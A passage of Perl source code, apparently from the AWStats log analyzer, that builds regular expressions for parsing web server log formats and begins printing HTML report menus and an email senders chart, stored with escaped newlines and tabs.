\\\\\\\"(.*?)\\\\\\\" \\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";\n\t\t\t$PerlParsingFormat =\n\"([^ ]+) [^ ]+ ([^\\\\/\\\\[]+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) ([^ ]+)(?: [^\\\\\\\"]+|)\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+) \\\\\\\"(.*?)\\\\\\\" \\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";\n\t\t\t$pos_host    = 0;\n\t\t\t$pos_logname = 1;\n\t\t\t$pos_date    = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t$pos_referer = 7;\n\t\t\t$pos_agent   = 8;\n\t\t\t@fieldlib    = (\n\t\t\t\t'host', 'logname', 'date', 'method', 'url', 'code',\n\t\t\t\t'size', 'referer', 'ua'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '2' )\n\t\t{ # Same than \"date time c-ip cs-username cs-method cs-uri-stem sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\"\n\t\t\t$PerlParsingFormat =\n\"(\\\\S+ \\\\S+) (\\\\S+) (\\\\S+) (\\\\S+) (\\\\S+) ([\\\\d|-]+) ([\\\\d|-]+) \\\\S+ (\\\\S+) (\\\\S+)\";\n\t\t\t$pos_date    = 0;\n\t\t\t$pos_host    = 1;\n\t\t\t$pos_logname = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t$pos_agent   = 7;\n\t\t\t$pos_referer = 8;\n\t\t\t@fieldlib    = (\n\t\t\t\t'date', 'host', 'logname', 'method', 'url', 'code',\n\t\t\t\t'size', 'ua',   'referer'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '3' ) {\n\t\t\t$PerlParsingFormat =\n\"([^\\\\t]*\\\\t[^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([\\\\d|-]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t[^\\\\t]*\\\\t([^\\\\t]*)\\\\t([\\\\d]*)\";\n\t\t\t$pos_date    = 0;\n\t\t\t$pos_method  = 1;\n\t\t\t$pos_code    = 2;\n\t\t\t$pos_host    = 3;\n\t\t\t$pos_agent   = 4;\n\t\t\t$pos_referer = 5;\n\t\t\t$pos_url     = 6;\n\t\t\t$pos_size    = 7;\n\t\t\t@fieldlib    = (\n\t\t\t\t'date', 'method',  'code', 'host',\n\t\t\t\t'ua',   'referer', 'url',  'size'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '4' ) {    # Same than \"%h %l %u %t \\\"%r\\\" %>s %b\"\n\t\t\t# %u (user) is \"(.+)\" instead of \"[^ ]+\" because can contain space (Lotus Notes).\n\t\t\t# Sample: 10.100.10.45 - BMAA\\will.smith [01/Jul/2013:07:17:28 +0200] \"GET /Download/__Omnia__Aus- und Weiterbildung__Konsular- und Verwaltungskonferenz, Programm.doc HTTP/1.1\" 200 9076810\n#\t\t\t$PerlParsingFormat = \n#\"([^ ]+) [^ ]+ (.+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) ([^ ]+)(?: [^\\\\\\\"]+|)\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+)\";\n\t\t\t$PerlParsingFormat = \n\"([^ ]+) [^ ]+ (.+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) (.+) [^\\\\\\\"]+\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+)\";\n\t\t\t$pos_host    = 0;\n\t\t\t$pos_logname = 1;\n\t\t\t$pos_date    = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t@fieldlib    =\n\t\t\t  ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size' );\n\t\t}\n\t}\n\telse {    # Personalized log format\n\t\tmy $LogFormatString = $LogFormat;\n\n\t\t# Replacement for Notes format string that are not Apache\n\t\t$LogFormatString =~ s/%vh/%virtualname/g;\n\n\t\t# Replacement for Apache format string\n\t\t$LogFormatString =~ s/%v(\\s)/%virtualname$1/g;\n\t\t$LogFormatString =~ s/%v$/%virtualname/g;\n\t\t$LogFormatString =~ s/%h(\\s)/%host$1/g;\n\t\t$LogFormatString =~ s/%h$/%host/g;\n\t\t$LogFormatString =~ s/%l(\\s)/%other$1/g;\n\t\t$LogFormatString =~ s/%l$/%other/g;\n\t\t$LogFormatString =~ s/\\\"%u\\\"/%lognamequot/g;\n\t\t$LogFormatString =~ s/%u(\\s)/%logname$1/g;\n\t\t$LogFormatString =~ s/%u$/%logname/g;\n\t\t$LogFormatString =~ s/%t(\\s)/%time1$1/g;\n\t\t$LogFormatString =~ s/%t$/%time1/g;\n\t\t$LogFormatString =~ s/\\\"%r\\\"/%methodurl/g;\n\t\t$LogFormatString =~ s/%>s/%code/g;\n\t\t$LogFormatString =~ s/%b(\\s)/%bytesd$1/g;\n\t\t$LogFormatString =~ s/%b$/%bytesd/g;\n\t\t$LogFormatString =~ s/\\\"%\\{Referer}i\\\"/%refererquot/g;\n\t\t$LogFormatString =~ s/\\\"%\\{User-Agent}i\\\"/%uaquot/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_input_size}n/%gzipin/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_output_size}n/%gzipout/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_compression_ratio}n/%gzipratio/g;\n\t\t$LogFormatString =~ s/\\(%\\{ratio}n\\)/%deflateratio/g;\n\n\t\t# Replacement for a IIS and ISA format string\n\t\t$LogFormatString =~ s/cs-uri-query/%query/g;    # Must be before cs-uri\n\t\t$LogFormatString =~ s/date\\stime/%time2/g;\n\t\t$LogFormatString =~ s/c-ip/%host/g;\n\t\t$LogFormatString =~ s/cs-username/%logname/g;\n\t\t$LogFormatString =~ s/cs-method/%method/g;  # GET, POST, SMTP, RETR STOR\n\t\t$LogFormatString =~ s/cs-uri-stem/%url/g;\n\t\t$LogFormatString =~ s/cs-uri/%url/g;\n\t\t$LogFormatString =~ s/sc-status/%code/g;\n\t\t$LogFormatString =~ s/sc-bytes/%bytesd/g;\n\t\t$LogFormatString =~ s/cs-version/%other/g;  # Protocol\n\t\t$LogFormatString =~ s/cs\\(User-Agent\\)/%ua/g;\n\t\t$LogFormatString =~ s/c-agent/%ua/g;\n\t\t$LogFormatString =~ s/cs\\(Referer\\)/%referer/g;\n\t\t$LogFormatString =~ s/cs-referred/%referer/g;\n\t\t$LogFormatString =~ s/sc-authenticated/%other/g;\n\t\t$LogFormatString =~ s/s-svcname/%other/g;\n\t\t$LogFormatString =~ s/s-computername/%other/g;\n\t\t$LogFormatString =~ s/r-host/%virtualname/g;\n\t\t$LogFormatString =~ s/cs-host/%virtualname/g;\n\t\t$LogFormatString =~ s/r-ip/%other/g;\n\t\t$LogFormatString =~ s/r-port/%other/g;\n\t\t$LogFormatString =~ s/time-taken/%other/g;\n\t\t$LogFormatString =~ s/cs-bytes/%other/g;\n\t\t$LogFormatString =~ s/cs-protocol/%other/g;\n\t\t$LogFormatString =~ s/cs-transport/%other/g;\n\t\t$LogFormatString =~\n\t\t  s/s-operation/%method/g;    # GET, POST, SMTP, RETR STOR\n\t\t$LogFormatString =~ s/cs-mime-type/%other/g;\n\t\t$LogFormatString =~ s/s-object-source/%other/g;\n\t\t$LogFormatString =~ s/s-cache-info/%other/g;\n\t\t$LogFormatString =~ s/cluster-node/%cluster/g;\n\t\t$LogFormatString =~ s/s-sitename/%other/g;\n\t\t$LogFormatString =~ s/s-ip/%other/g;\n\t\t$LogFormatString =~ s/s-port/%other/g;\n\t\t$LogFormatString =~ s/cs\\(Cookie\\)/%other/g;\n\t\t$LogFormatString =~ s/sc-substatus/%other/g;\n\t\t$LogFormatString =~ s/sc-win32-status/%other/g;\n\n\n\t\t# Added for MMS\n\t\t$LogFormatString =~\n\t\t  s/protocol/%protocolmms/g;    # cs-method might not be available\n\t\t$LogFormatString =~\n\t\t  s/c-status/%codemms/g;    # c-status used when sc-status not available\n\t\tif ($Debug) { debug(\" LogFormatString=$LogFormatString\"); }\n\n# $LogFormatString has an AWStats format, so we can generate PerlParsingFormat variable\n\t\tmy $i                       = 0;\n\t\tmy $LogSeparatorWithoutStar = $LogSeparator;\n\t\t$LogSeparatorWithoutStar =~ s/[\\*\\+]//g;\n\t\tforeach my $f ( split( /\\s+/, $LogFormatString ) ) {\n\n\t\t\t# Add separator for next field\n\t\t\tif ($PerlParsingFormat) { $PerlParsingFormat .= \"$LogSeparator\"; }\n\n\t\t\t# If field is prefixed with custom string, just push it to regex literally\n\t\t\tif ( $f =~ /^([^%]+)%/ ) {\n\t\t\t\t$PerlParsingFormat .= \"$1\"\n                        }\n\n\t\t\t# Special for logname\n\t\t\tif ( $f =~ /%lognamequot$/ ) {\n\t\t\t\t$pos_logname = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'logname';\n\t\t\t\t$PerlParsingFormat .=\n\t\t\t\t  \"\\\\\\\"?([^\\\\\\\"]*)\\\\\\\"?\"\n\t\t\t\t  ; # logname can be \"value\", \"\" and - in same log (Lotus notes)\n\t\t\t}\n\t\t\telsif ( $f =~ /%logname$/ ) {\n\t\t\t\t$pos_logname = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'logname';\n\n# %u (user) is \"([^\\\\/\\\\[]+)\" instead of \"[^$LogSeparatorWithoutStar]+\" because can contain space (Lotus Notes).\n\t\t\t\t$PerlParsingFormat .= \"([^\\\\/\\\\[]+)\";\n\t\t\t}\n\n\t\t\t# Date format\n\t\t\telsif ( $f =~ /%time1$/ || $f =~ /%time1b$/ )\n\t\t\t{ # [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],  time1b kept for backward compatibility\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$pos_tz = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'tz';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\[([^$LogSeparatorWithoutStar]+)( [^$LogSeparatorWithoutStar]+)?\\\\]\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time2$/ ) {    # yyyy-mm-dd hh:mm:ss\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .=\n\"([^$LogSeparatorWithoutStar]+\\\\s[^$LogSeparatorWithoutStar]+)\";                        # Need \\s for Exchange log files\n\t\t\t}\n\t\t\telsif ( $f =~ /%time3$/ )\n\t\t\t{ # mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .=\n\"(?:\\\\w\\\\w\\\\w )?(\\\\w\\\\w\\\\w \\\\s?\\\\d+ \\\\d\\\\d:\\\\d\\\\d:\\\\d\\\\d(?: \\\\d\\\\d\\\\d\\\\d)?)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time4$/ ) {    # ddddddddddddd\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$PerlParsingFormat .= \"(\\\\d+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%time5$/ ) {\n\t\t\t\t# Supports the following formats:\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss           (Incomplete ISO 8601)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ssZ          (ISO 8601, zero meridian)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss+00:00     (ISO 8601)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss+0000      (Apache's best approximation to ISO 8601 using \"%{%Y-%m-%dT%H:%M:%S%z}t\" in LogFormat)\n\t\t\t\t# - yyyy-mm-ddThh:mm:ss.000000Z   (Amazon AWS log files)\n\t\t\t\t$pos_date = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'date';\n\t\t\t\t$pos_tz = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'tz';\n\t\t\t\t$PerlParsingFormat .=\n\"([^$LogSeparatorWithoutStar]+T[^$LogSeparatorWithoutStar]+)(Z|[-+\\.]\\\\d\\\\d[:\\\\.\\\\dZ]*)?\";\n\t\t\t}\n\n\t\t\t# Special for methodurl, methodurlprot and methodurlnoprot\n\t\t\telsif ( $f =~ /%methodurl$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\n#\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\\\\\"]+\\\\\\\"\";\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\\\\\"]+|)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%methodurlprot$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^\\\\\\\"]+) ([^\\\\\\\"]+)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%methodurlnoprot$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .=\n\"\\\\\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\\\\\"\";\n\t\t\t}\n\n\t\t\t# Common command tags\n\t\t\telsif ( $f =~ /%virtualnamequot$/ ) {\n\t\t\t\t$pos_vh = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'vhost';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"([^$LogSeparatorWithoutStar]+)\\\\\\\"\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%virtualname$/ ) {\n\t\t\t\t$pos_vh = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'vhost';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host_r$/ ) {\n\t\t\t\t$pos_hostr = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'hostr';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host$/ ) {\n\t\t\t\t$pos_host = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'host';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%host_proxy$/ )\n\t\t\t{    # if host_proxy tag used, host tag must not be used\n\t\t\t\t$pos_host = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'host';\n\t\t\t\t$PerlParsingFormat .= \"(.+?)(?:, .*)*\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%method$/ ) {\n\t\t\t\t$pos_method = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%url$/ ) {\n\t\t\t\t$pos_url = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'url';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%query$/ ) {\n\t\t\t\t$pos_query = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'query';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%code$/ ) {\n\t\t\t\t$pos_code = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'code';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%bytesd$/ ) {\n\t\t\t\t$pos_size = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'size';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%refererquot$/ ) {\n\t\t\t\t$pos_referer = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'referer';\n\t\t\t\t$PerlParsingFormat .=\n\t\t\t\t  \"\\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";    # referer might be \"\"\n\t\t\t}\n\t\t\telsif ( $f =~ /%referer$/ ) {\n\t\t\t\t$pos_referer = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'referer';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%uaquot$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";    # ua might be \"\"\n\t\t\t}\n\t\t\telsif ( $f =~ /%uabracket$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\[([^\\\\\\]]*)\\\\\\]\";    # ua might be []\n\t\t\t}\n\t\t\telsif ( $f =~ /%ua$/ ) {\n\t\t\t\t$pos_agent = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'ua';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipin$/ ) {\n\t\t\t\t$pos_gzipin = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipin';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipout/ )\n\t\t\t{ # Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields\n\t\t\t\t$pos_gzipout = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipout';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%gzipratio/ )\n\t\t\t{ # Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields\n\t\t\t\t$pos_compratio = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'gzipratio';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%deflateratio/ )\n\t\t\t{ # Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields\n\t\t\t\t$pos_compratio = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'deflateratio';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%email_r$/ ) {\n\t\t\t\t$pos_emailr = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'email_r';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%email$/ ) {\n\t\t\t\t$pos_emails = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'email';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%cluster$/ ) {\n\t\t\t\t$pos_cluster = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'clusternb';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%timetaken$/ ) {\n\t\t\t\t$pos_timetaken = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, 'timetaken';\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\n# Special for protocolmms, used for method if method not already found (for MMS)\n\t\t\telsif ( $f =~ /%protocolmms$/ ) {\n\t\t\t\tif ( $pos_method < 0 ) {\n\t\t\t\t\t$pos_method = $i;\n\t\t\t\t\t$i++;\n\t\t\t\t\tpush @fieldlib, 'method';\n\t\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t\t}\n\t\t\t}\n\n   # Special for codemms, used for code only if code not already found (for MMS)\n\t\t\telsif ( $f =~ /%codemms$/ ) {\n\t\t\t\tif ( $pos_code < 0 ) {\n\t\t\t\t\t$pos_code = $i;\n\t\t\t\t\t$i++;\n\t\t\t\t\tpush @fieldlib, 'code';\n\t\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Extra tag\n\t\t\telsif ( $f =~ /%extra(\\d+)$/ ) {\n\t\t\t\t$pos_extra[$1] = $i;\n\t\t\t\t$i++;\n\t\t\t\tpush @fieldlib, \"extra$1\";\n\t\t\t\t$PerlParsingFormat .= \"([^$LogSeparatorWithoutStar]+)\";\n\t\t\t}\n\n\t\t\t# Other tag\n\t\t\telsif ( $f =~ /%other$/ ) {\n\t\t\t\t$PerlParsingFormat .= \"[^$LogSeparatorWithoutStar]+\";\n\t\t\t}\n\t\t\telsif ( $f =~ /%otherquot$/ ) {\n\t\t\t\t$PerlParsingFormat .= \"\\\\\\\"[^\\\\\\\"]*\\\\\\\"\";\n\t\t\t}\n\n\t\t\t# Unknown tag (no parenthesis)\n\t\t\telse {\n\t\t\t\t$PerlParsingFormat .= \"[^$LogSeparatorWithoutStar]+\";\n\t\t\t}\n\t\t}\n\t\tif ( !$PerlParsingFormat ) {\n\t\t\terror(\"No recognized format tag in personalized LogFormat string\");\n\t\t}\n\t}\n\tif ( $pos_host < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%host in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_date < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%time1 or \\%time2 in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_method < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%methodurl or \\%method in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_url < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%methodurl or \\%url in your LogFormat string).\"\n\t\t);\n\t}\n\tif ( $pos_code < 0 ) {\n\t\terror(\n\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%code in your LogFormat string).\"\n\t\t);\n\t}\n#\tif ( $pos_size < 0 ) {\n#\t\terror(\n#\"Your personalized LogFormat does not include all fields required by AWStats (Add \\%bytesd in your LogFormat string).\"\n#\t\t);\n#\t}\n\t$PerlParsingFormat = qr/^$PerlParsingFormat/;\n\tif ($Debug) { debug(\" PerlParsingFormat is $PerlParsingFormat\"); }\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints a menu category for the frame or static header\n# Parameters:   -\n# Input:        $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,\n#\t\t\t\t$NewLinkParams, $NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowMenuCateg {\n\tmy ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,\n\t\t$NewLinkParams, $NewLinkTarget )\n\t  = ( shift, shift, shift, shift, shift, shift, shift, shift );\n\t$categicon = '';    # Comment this to enabme category icons\n\tmy ( $menu, $menulink, $menutext ) = ( shift, shift, shift );\n\tmy $linetitle = 0;\n\n\t# Call to plugins' function AddHTMLMenuLink\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {\n\n# my $function=\"AddHTMLMenuLink_$pluginname('$categ',\\$menu,\\$menulink,\\$menutext)\";\n# eval(\"$function\");\n\t\tmy $function = \"AddHTMLMenuLink_$pluginname\";\n\t\t&$function( $categ, $menu, $menulink, $menutext );\n\t}\n\tforeach my $key (%$menu) {\n\t\tif ( $menu->{$key} && $menu->{$key} > 0 ) { $linetitle++; last; }\n\t}\n\tif ( !$linetitle ) { return; }\n\n# At least one entry in menu for this category, we can show category and entries\n\tmy $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );\n\tprint \"<tr><td class=\\\"awsm\\\" width=\\\"$WIDTHMENU1\\\"\"\n\t  . ( $frame ? \"\" : \" valign=\\\"top\\\"\" ) . \">\"\n\t  . ( $categicon ? \"<img src=\\\"$DirIcons/other/$categicon\\\" />&nbsp;\" : \"\" )\n\t  . \"<b>$categtext:</b></td>\\n\";\n\tprint( $frame? \"</tr>\\n\" : \"<td class=\\\"awsm\\\">\" );\n\tforeach my $key ( sort { $menu->{$a} <=> $menu->{$b} } keys %$menu ) {\n\t\tif ( $menu->{$key} == 0 )     { next; }\n\t\tif ( $menulink->{$key} == 1 ) {\n\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\tprint\n\t\t\t  \"<a href=\\\"$linkanchor#$key\\\"$targetpage>$menutext->{$key}</a>\";\n\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t}\n\t\tif ( $menulink->{$key} == 2 ) {\n\t\t\tprint( $frame\n\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t: \"\"\n\t\t\t);\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=$key\")\n\t\t\t\t: \"$StaticLinks.$key.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$menutext->{$key}</a>\\n\";\n\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t}\n\t}\n\tprint( $frame? \"\" : \"</td></tr>\\n\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints HTML to display an email senders chart\n# Parameters:   -\n# Input:        $NewLinkParams, NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowEmailSendersChart {\n\tmy $NewLinkParams         = shift;\n\tmy $NewLinkTarget         = shift;\n\tmy $MaxLengthOfShownEMail = 48;\n\n\tmy $total_p;\n\tmy $total_h;\n\tmy $total_k;\n\tmy $max_p;\n\tmy $max_h;\n\tmy $max_k;\n\tmy $rest_p;\n\tmy $rest_h;\n\tmy $rest_k;\n\n\t# Show filter form\n\t#&ShowFormFilter(\"emailsfilter\",$EmailsFilter);\n\t# Show emails list\n\n\tprint \"$Center<a name=\\\"emailsenders\\\">&nbsp;</a><br />\\n\";\n\tmy $title;\n\tif ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {\n\t\t$title = \"$Message[131]\";\n\t}\n\telse {\n\t\t$title =\n\"$Message[131] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allemails\")\n\t\t\t: \"$StaticLinks.allemails.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastemails\")\n\t\t\t\t: \"$StaticLinks.lastemails.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t\t}\n\t}\n\t&tab_head( \"$title\", 19, 0, 'emailsenders' 